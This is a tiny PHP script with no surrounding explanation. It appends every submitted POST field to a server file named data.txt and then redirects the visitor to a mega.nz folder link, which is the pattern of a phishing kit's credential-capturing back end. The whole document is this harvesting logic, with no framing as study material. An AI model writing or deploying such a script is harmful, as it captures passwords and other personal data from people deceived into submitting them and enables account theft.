<?php
$handle = fopen("data.txt", "a");
file_put_contents('data.txt', '');
foreach($_POST as $value) {
fwrite($handle, $value);
fwrite($handle, PHP_EOL);
}
fclose($handle);
header("Location: https://mega.nz/folder/qzx0yLbb")
?>
